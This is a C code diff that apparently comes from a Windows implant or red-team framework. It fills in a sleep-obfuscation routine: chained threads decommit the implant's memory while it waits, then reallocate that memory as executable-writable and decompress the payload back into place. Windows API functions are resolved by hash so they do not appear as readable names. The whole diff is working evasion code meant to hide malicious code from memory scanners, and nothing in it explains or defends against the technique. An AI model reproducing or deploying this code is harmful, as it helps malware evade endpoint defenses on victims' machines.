@@ -522,6 +522,10 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 	PVOID				Wrk = NULL;
 	PVOID				Tmp = NULL;
 
+	HANDLE				Th1 = NULL;
+	HANDLE				Th2 = NULL;
+	HANDLE				Th3 = NULL;
+	HANDLE				Th4 = NULL;
 	HANDLE				Evt = NULL;
 	LPVOID				Mem = NULL;
 
@@ -630,8 +634,91 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 		/* Set the new pointer */
 		Cmp = C_PTR( Tmp );
 
+		/* Call NtFreeVirtualMemory */
+		Nst = ThreadSetCallInternal(
+				&Th1,
+				Evt,
+				Sfp,
+				Sfl,
+				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtFreeVirtualMemory" ) ),
+				4,
+				NtCurrentProcess(),
+				&Mem,
+				&Len,
+				MEM_DECOMMIT
+		);
+
+		if ( ! NT_SUCCESS( Nst ) ) {
+			/* Abort! */
+			break;
+		};
+
+		/* Call NtWaitForSingleOBject */
+		Nst = ThreadSetCallInternal(
+				&Th2,
+				Th1,
+				Sfp,
+				Sfl,
+				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtWaitForSingleObject" ) ),
+				3,
+				Handle,
+				Alertable,
+				Timeout
+		);
+
+		/* Failed to spawn call to NtWaitForSingleObject! */
+		if ( ! NT_SUCCESS( Nst ) ) {
+			/* Abort! */
+			break;
+		};
+
+		/* Call NtAllocateVirtualMemory */
+		Nst = ThreadSetCallInternal(
+				&Th3,
+				Th2,
+				Sfp,
+				Sfl,
+				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtAllocateVirtualMemory" ) ),
+				6,
+				NtCurrentProcess(),
+				&Mem,
+				0,
+				&Len,
+				MEM_COMMIT,
+				PAGE_EXECUTE_READWRITE
+		);
+
+		/* Failed to spawn a call to NtAllocateVirtualMemory */
+		if ( ! NT_SUCCESS( Nst ) ) {
+			/* Abort! */
+			break;
+		};
+
+		/* Call RtlDecompressBufferEx */
+		Nst = ThreadSetCallInternal(
+				&Th4,
+				Th3,
+				Sfp,
+				Sfl,
+				PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "RtlDecompressBufferEx" ) ),
+				7,
+				COMPRESSION_FORMAT_XPRESS_HUFF | COMPRESSION_ENGINE_MAXIMUM,
+				Mem,
+				Len,
+				Cmp,
+				Cln,
+				&Len,
+				Wrk
+		);
+
+		/* Failed to spawn a call to RtlDecompressBufferEx */
+		if ( ! NT_SUCCESS( Nst ) ) {
+			/* Abort! */
+			break;
+		};
+
 		/* Signal and wait for the last call to complete */
-		Nst = Api.NtSignalAndWaitForSingleObject( Evt, /* Put ending thread handle here */ NULL, FALSE, NULL );
+		Nst = Api.NtSignalAndWaitForSingleObject( Evt, Th4, FALSE, NULL );
 
 		/* Failed to signal/and or wait on the thread */
 		if ( ! NT_SUCCESS( Nst ) ) {
@@ -639,7 +726,7 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 		};
 
 		/* Query the exit status of the NtWaitForSingleObject call */
-		Nst = Api.NtQueryInformationThread( /* Put blocking thread handle here */ NULL, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL );
+		Nst = Api.NtQueryInformationThread( Th2, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL );
 
 		/* Failed to query its basic information */
 		if ( ! NT_SUCCESS( Nst ) ) {
@@ -650,6 +737,18 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 		Nst = Tbi.ExitStatus;
 	} while ( 0 );
 
+	if ( Th4 != NULL ) {
+		Api.NtClose( Th4 );
+	};
+	if ( Th3 != NULL ) {
+		Api.NtClose( Th3 );
+	};
+	if ( Th2 != NULL ) {
+		Api.NtClose( Th2 );
+	};
+	if ( Th1 != NULL ) {
+		Api.NtClose( Th1 );
+	};
 	if ( Cmp != NULL ) {
 		MemoryFree( Cmp );
 	};
